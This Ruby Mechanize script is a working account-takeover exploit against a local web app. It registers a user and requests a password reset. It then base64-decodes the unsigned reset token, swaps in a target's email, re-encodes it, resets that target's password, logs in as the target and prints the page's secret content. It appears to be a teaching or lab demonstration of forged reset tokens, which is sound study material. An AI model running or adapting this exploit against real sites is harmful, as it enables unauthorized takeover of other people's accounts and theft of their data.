require 'mechanize'
require 'base64'

TARGET = 'j.osterman@watchmen.net'
EMAIL  = 'fox@fox.com'
PASS   = '123456789'

Mechanize.new.instance_eval do
    
  # Create a new user account
  get 'http://localhost:3000/users/new'

  page.forms.first.tap do |f|
    f['user[email]']                 = EMAIL
    f['user[password]']              = PASS
    f['user[password_confirmation]'] = PASS
    f.submit
  end

  # Reset the password
  get '/password_reset_request/new'

  page.forms.first.tap do |f|
    f['email']      = EMAIL
    f.submit
  end

  # Now we magically grab the token we are given
  token = 'ZW1haWw9Zm94QGZveC5jb20mZXhwaXJlcz0xNDI0OTUzOTIw'
  puts '[+] Reading the token...' + token

  # Decode the token and substitute in target
  decoded_token = Base64.decode64(token)
  
  puts '[+] Substituting target email: ' + TARGET
  new_token = decoded_token.gsub(EMAIL, TARGET)

  new_token = Base64.urlsafe_encode64(new_token)
  puts '[+] Encoding new token: ' + new_token

  # Reset the password
  puts '[+] Resetting the password'
  get '/password_reset/new?token=' + new_token

  page.forms.first.tap do |f|
    f['user[password]']              = PASS
    f['user[password_confirmation]'] = PASS
    f.submit
  end

  # Sign in as target
  get '/session/new'

  page.forms.first.tap do |f|
    f['email']    = TARGET
    f['password'] = PASS
    f.submit
  end

  # Print the secret
  puts '[+] Success!'
  puts page.search('.secret').text.strip
end
